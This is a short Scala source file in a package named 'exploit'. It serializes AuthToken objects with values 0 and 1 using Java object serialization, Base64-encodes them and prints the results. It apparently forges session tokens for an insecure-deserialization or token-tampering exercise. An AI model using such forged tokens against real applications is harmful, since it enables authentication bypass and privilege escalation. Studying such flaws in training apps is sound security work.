package utils.exploit

import models.AuthToken
import java.io._
import java.util.Base64

object DoSerialize {
  def run(): Unit = {
    var authToken = new AuthToken(0)
    val bos = new ByteArrayOutputStream()
    var out = new ObjectOutputStream(bos)
    out.writeObject(authToken)
    var finalToken = new String(Base64.getEncoder.encode(bos.toByteArray))
    out.writeObject(authToken)
    out.close
    System.out.println(finalToken)
    authToken = new AuthToken(1)
    val bos2 = new ByteArrayOutputStream
    val out2 = new ObjectOutputStream(bos2)
    out2.writeObject(authToken)
    finalToken = new String(Base64.getEncoder.encode(bos2.toByteArray))
    out2.writeObject(authToken)
    out2.close
    System.out.println(finalToken)
  }
}
